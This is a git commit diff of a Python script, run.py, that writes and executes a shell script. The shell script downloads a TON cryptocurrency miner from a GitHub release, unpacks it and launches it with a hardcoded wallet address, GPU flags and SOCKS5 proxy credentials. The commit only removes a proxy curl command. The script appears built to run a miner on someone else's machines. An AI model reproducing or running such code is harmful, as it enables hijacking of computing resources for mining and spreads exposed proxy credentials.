a89bd34ecde7b8a3cab1bbb87c98d30fdde3df4e
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-02-13 05:17:21 -0500

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
-os.system('echo "curl -v -x "socks5://mastukimen-rotate:simbahkencot@p.webshare.io:80/" webshare.io/ && wget https://github.com/toncoinpool/stratum-miner/releases/download/v2.1.1/TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && tar -xvf TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && cd TON-Stratum-Miner" >> tes')
+os.system('echo "wget https://github.com/toncoinpool/stratum-miner/releases/download/v2.1.1/TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && tar -xvf TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && cd TON-Stratum-Miner" >> tes')
 os.system('echo "./TON-Stratum-Miner -w EQDHZfuQIei_NiZ2hBK0eJGGoLEJOAaS6mYUNVGW44vBCli3 -b cuda-18 -F 2048 --exclude-gpus 1 -r rk - export proxy socks5://sikencot-rotate:mbah2237@p.webshare.io:80" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
